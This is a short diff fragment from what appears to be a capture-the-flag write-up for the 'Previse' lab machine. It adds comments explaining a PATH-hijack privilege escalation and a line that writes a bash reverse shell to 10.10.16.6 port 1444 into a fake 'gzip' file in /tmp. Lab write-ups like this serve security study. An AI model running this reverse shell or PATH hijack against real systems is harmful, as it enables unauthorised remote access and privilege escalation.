@@ -379,7 +379,9 @@
     m4lwhere@previse:~$ which gzip
     /bin/gzip
 
-// 
+// Now we will make our malicious(Reverse shell) gzip file in /tmp folder
+
+// and inject /tmp to PATH 
 
     m4lwhere@previse:~$ cd /tmp/
     m4lwhere@previse:/tmp$ echo "bash -i >& /dev/tcp/10.10.16.6/1444 0>&1" > gzip  
